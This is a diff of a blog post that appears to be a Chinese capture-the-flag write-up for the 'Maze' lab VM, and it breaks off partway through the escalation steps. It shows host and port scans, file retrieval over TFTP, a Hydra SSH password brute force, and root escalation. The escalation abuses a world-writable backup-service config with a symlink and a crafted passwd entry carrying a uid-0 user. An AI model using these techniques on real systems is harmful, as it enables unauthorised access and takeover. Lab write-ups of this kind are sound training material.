@@ -1,4 +1,298 @@
-<!-- ##{"script":"<script src='https://7r1umphk.github.io/plugins/jiami.js'></script>"}## -->
-<!--encrypt: 3ea4d927-->
-<!--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-->
-<!--/encrypt-->
+# 一、信息收集
+
+## 主机发现
+
+使用`arp-scan`扫描局域网内的主机：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.158 08:00:27:55:48:f5       PCS Systemtechnik GmbH
+...
+```
+
+发现目标主机：`192.168.205.158`
+
+## 端口扫描
+
+对目标主机进行全端口TCP扫描：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.158
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 11:31 GMT
+Nmap scan report for 192.168.205.158
+Host is up (0.00011s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:55:48:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
+```
+
+开放端口：
+
+- 22/tcp: SSH服务
+- 80/tcp: HTTP服务
+
+## 服务探测
+
+### HTTP服务分析
+
+访问Web首页发现是靶场介绍页面，识别出CMS为Grav 1.7.48。虽然该版本存在RCE漏洞，但需要登录权限，而admin登录页面无法访问，因此该攻击路径不可行。
+
+### UDP端口扫描
+
+对常用UDP端口进行扫描：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -sU --top-port 200 192.168.205.158
+...
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+69/udp open|filtered tftp
+...
+```
+
+发现TFTP服务运行在69/udp端口。
+
+> [!Tip]
+>
+> https://book.hacktricks.wiki/zh/network-services-pentesting/69-udp-tftp.html#69---udp-tftp
+
+# 二、TFTP服务利用
+
+## 连接测试
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tftp 192.168.205.158
+tftp> 
+```
+
+连接成功，但TFTP不提供目录列表功能，需要手动猜测文件名。
+
+## 文件枚举
+
+通过手动测试常见文件名：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ tftp 192.168.205.158
+tftp> get id_rsa
+Error code 1: File not found
+tftp> get passwd
+Error code 1: File not found
+tftp> get secret
+Error code 1: File not found
+tftp> get user.txt
+```
+
+成功获取到`user.txt`文件：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cat user.txt                                               
+flag{user-4e79af9d9b43464228ae1100839a2575}
+username:bamuwe
+need:bruteforce
+```
+
+获得关键信息：
+
+- User flag: `flag{user-4e79af9d9b43464228ae1100839a2575}`
+- 用户名: `bamuwe`
+- 提示: 需要暴力破解
+
+# 三、SSH暴力破解
+
+使用Hydra对SSH服务进行密码暴力破解，使用Sublarge最喜欢的字典(:
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ hydra -l bamuwe -P xato-net-10-million-passwords.txt ssh://192.168.205.158 -f -I -u -e nsr -t 64
+...
+[22][ssh] host: 192.168.205.158   login: bamuwe   password: hahaha
+[STATUS] attack finished for 192.168.205.158 (valid pair found)
+...
+```
+
+成功破解密码：`bamuwe:hahaha`
+
+# 四、初始访问
+
+## SSH登录
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh bamuwe@192.168.205.158
+bamuwe@192.168.205.158's password: 
+...
+bamuwe@Maze:~$ 
+```
+
+成功获取shell访问权限。
+
+## 权限枚举
+
+### 基础信息收集
+
+```bash
+bamuwe@Maze:~$ id
+uid=1005(bamuwe) gid=1005(bamuwe) groups=1005(bamuwe)
+
+bamuwe@Maze:~$ sudo -l
+...
+Sorry, user bamuwe may not run sudo on Maze.
+```
+
+用户无sudo权限。
+
+### SUID程序检查
+
+```bash
+bamuwe@Maze:~$ find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
+...
+```
+
+未发现可利用的SUID程序。
+
+### 用户文件权限
+
+```bash
+bamuwe@Maze:~$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null
+...
+/etc/modprobe.d
+/etc/modprobe.d/pwn.conf
+/etc/modprobe.d/get_root.conf
+```
+
+发现用户对`/etc/modprobe.d/`目录下的配置文件有权限，但是没用sudo、suid、capabilities意义不大。
+
+# 五、权限提升
+
+## 服务分析
+
+在`/opt`目录下发现关键服务脚本：
+
+```bash
+bamuwe@Maze:/opt$ cat log_backup_service.py
+#!/usr/bin/env python3
+
+import os
+import json
+import time
+import shutil
+import logging
+from datetime import datetime
+...
+```
+
+这是一个以root权限运行的日志备份服务，通过分析代码发现以下关键点：
+
+1. 服务以root权限运行
+2. 配置文件路径：`/etc/log_backup_service/config.json`
+3. 具有任意文件复制功能
+4. 文件名格式：`{backup_filename}.{timestamp}.bak`
+
+## 配置文件权限检查
+
+```bash
+bamuwe@Maze:/opt$ ls -al /etc/log_backup_service/config.json
+-rwxrwxrwx 1 root root 113 Aug 15 08:08 /etc/log_backup_service/config.json
+```
+
+我到这我就扒拉了一个`root.txt`交了，后面有空了，才扒拉拿shell。
+
+这个是可以实现任意文件写入的，当然要软连接，它规则写的挺死。
+
+```python
+archive_path = os.path.join(backup_dest, f"{backup_filename}.{timestamp}.bak")
+```
+
+聪明的小伙伴就会问了，我不能读shadow和ssh私钥吗，不巧root密码爆破不出来，ssh私钥和公钥对不上，无法利用。
+
+## 提权利用
+
+### 1. 时间戳计算
+
+先随便写入到一个文件看看时间戳
+
+```bash
+bamuwe@Maze:~/a$ cat /etc/log_backup_service/config.json
+{
+  "source_log_path": "/var/log/my_app.log",
+  "backup_dest": "/tmp/a/",
+  "run_as_user": "root"
+}
+```
+
+稍等片刻
+
+```bash
+bamuwe@Maze:~/a$ ls -la /tmp/a/
+total 8
+drwxr-xr-x  2 root root 4096 Sep  4 07:55 .
+drwxrwxrwt 11 root root 4096 Sep  4 07:55 ..
+-rw-r--r--  1 root root    0 Sep  4 07:55 my_app.log.20250904075549.bak
+```
+
+20250904 日期（固定）
+
+0755 时间（修改）
+
+49 秒（固定）
+
+填一个和你时间靠近的就好了
+
+### 2.准备恶意passwd文件
+
+```bash
+bamuwe@Maze:/tmp$ cp /etc/passwd passwd
+bamuwe@Maze:/tmp$ vim passwd
+bamuwe@Maze:/tmp$ tail -n 1 passwd
+b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash
+```
+
+### 3. 软链接攻击
+
+```bash
+bamuwe@Maze:/tmp$ cd
+bamuwe@Maze:~$ mkdir a
+bamuwe@Maze:~$ cd a/
+bamuwe@Maze:~/a$ vim /etc/log_backup_service/config.json
